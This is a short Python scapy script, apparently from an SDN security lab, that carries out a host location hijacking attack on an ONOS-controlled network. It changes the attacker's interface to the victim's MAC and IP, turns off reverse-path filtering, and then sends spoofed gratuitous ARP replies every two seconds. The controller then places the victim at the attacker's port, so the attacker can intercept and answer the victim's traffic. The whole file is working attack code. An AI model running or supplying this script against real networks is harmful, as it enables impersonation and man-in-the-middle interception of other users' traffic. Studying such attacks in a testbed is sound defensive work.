#!/usr/bin/env python3
"""Host Location Hijacking -> MITM (run on the attacker, atk)."""
import os, time
from scapy.all import Ether, ARP, sendp

VICTIM_MAC     = "00:00:00:00:00:02"   # h1's MAC (confirm in ONOS 'hosts')
VICTIM_IP      = "10.0.10.11"          # h1's IP
ATTACKER_IFACE = "atk-eth0"
GATEWAY        = "10.0.10.1"           # LAN A router (so the attacker can reply across subnets)
INTERVAL       = 2

# 1) Adopt the victim's identity (MAC + IP) so we receive AND can answer its traffic
os.system(f"ip link set dev {ATTACKER_IFACE} down")
os.system(f"ip link set dev {ATTACKER_IFACE} address {VICTIM_MAC}")
os.system(f"ip link set dev {ATTACKER_IFACE} up")
os.system(f"ip addr add {VICTIM_IP}/24 dev {ATTACKER_IFACE} 2>/dev/null")
# 2) Restore a route back to other subnets, and stop Linux dropping the 'spoofed' traffic
os.system(f"ip route add default via {GATEWAY} dev {ATTACKER_IFACE} 2>/dev/null")
os.system("sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null 2>&1")
os.system(f"sysctl -w net.ipv4.conf.{ATTACKER_IFACE}.rp_filter=0 >/dev/null 2>&1")
print(f"[*] Adopted victim identity {VICTIM_MAC} / {VICTIM_IP} on {ATTACKER_IFACE}")

# 3) Sustained Host Location Hijacking
pkt = Ether(src=VICTIM_MAC, dst="ff:ff:ff:ff:ff:ff") / \
      ARP(op=2, hwsrc=VICTIM_MAC, psrc=VICTIM_IP,
          hwdst="ff:ff:ff:ff:ff:ff", pdst=VICTIM_IP)
print(f"[*] Poisoning ONOS every {INTERVAL}s - victim's traffic will arrive AND be answered here. Ctrl+C to stop.")
n = 0
try:
    while True:
        sendp(pkt, iface=ATTACKER_IFACE, verbose=False)
        n += 1
        print(f"[+] poison #{n} - ONOS places {VICTIM_IP} at the attacker's port")
        time.sleep(INTERVAL)
except KeyboardInterrupt:
    print(f"\n[*] Stopped after {n} poisonings.")
